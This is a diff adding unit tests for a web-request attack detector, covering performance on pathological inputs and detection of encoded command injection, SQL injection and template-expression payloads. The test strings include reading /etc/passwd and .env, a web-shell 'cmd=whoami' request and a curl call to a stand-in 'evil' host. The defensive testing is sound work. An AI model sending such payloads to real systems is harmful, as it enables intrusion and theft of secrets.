@@ -148,6 +148,59 @@ describe("webAttackSignal", () => {
     expect(nul.matches[0].excerpt).not.toMatch(/\x00/);
   });
 
+  it("survives every pathological input at the field bound in linear time", () => {
+    // Each shape targets one rule's prefix; the whole table runs through webAttackSignal.
+    const shapes = [
+      "../".repeat(MAX_FIELD / 3),
+      "..\\".repeat(MAX_FIELD / 3),
+      ";".repeat(MAX_FIELD),
+      "${".repeat(MAX_FIELD / 2),
+      "{{".repeat(MAX_FIELD / 2),
+      "1 or ".repeat(MAX_FIELD / 5),
+      "a".repeat(MAX_FIELD),
+      "' or 1".repeat(MAX_FIELD / 6),
+      "union select ".repeat(MAX_FIELD / 13),
+      "/**/".repeat(MAX_FIELD / 4),
+      "x|id ".repeat(MAX_FIELD / 5),
+      "=".repeat(MAX_FIELD),
+    ];
+    for (const shape of shapes) {
+      const t0 = performance.now();
+      webAttackSignal(shape);
+      expect(performance.now() - t0, shape.slice(0, 12)).toBeLessThan(200);
+    }
+  });
+
+  it("does not let a literal plus from %2B become a space on the second pass", () => {
+    const t = decodeRequestTarget("/x?q=%24%7B7%2B7%7D");
+    expect(t.decoded).toBe("/x?q=${7+7}");
+    expect(fires(t.decoded)).toContain("expression");
+  });
+
+  it("treats a decoded newline as a separator and a SQL comment as whitespace", () => {
+    expect(fires(decodeRequestTarget("/x?q=foo%0Aid").decoded)).toContain("cmd");
+    expect(fires(decodeRequestTarget("/x?q=foo%0Acurl%20http://evil/x").decoded)).toContain("cmd");
+    expect(fires(decodeRequestTarget("/x?id=1%20UNION%2F**%2FSELECT%201").decoded)).toContain("sqli");
+    expect(fires(decodeRequestTarget("/x?id=1'%2F**%2FOR%2F**%2F1=1").decoded)).toContain("sqli");
+  });
+
+  it("fires on an exec-named parameter without a separator", () => {
+    expect(fires("/shell.php?cmd=whoami")).toContain("cmd");
+    expect(fires("/shell.php?cmd=cat+/etc/passwd")).toContain("cmd");
+    expect(fires("/x?cmd=ls%20-la")).toContain("cmd");
+    expect(fires("/x?command=abc")).toEqual([]); // a value that is not a command
+    expect(fires("/x?cmdline=id")).toEqual([]); // not an exec-named parameter
+  });
+
+  it("does not fire on matrix parameters, JSON filters or a reader without a path", () => {
+    expect(fires("/resource;id")).toEqual([]);
+    expect(fires("/resource;hostname")).toEqual([]);
+    expect(fires('/x?f={"expr":"x|type string"}')).toEqual([]);
+    expect(fires("/x?ip=127.0.0.1;id")).toContain("cmd"); // a value, then the injection
+    expect(fires("/x?q=a|type C:\\boot.ini")).toContain("cmd");
+    expect(fires("/x?q=;cat .env")).toContain("cmd");
+  });
+
   it("fires on the decoded form of an encoded attack", () => {
     const enc = decodeRequestTarget("/x?q=%3Bcat%20%2Fetc%2Fpasswd").decoded;
     expect(fires(enc)).toContain("cmd");
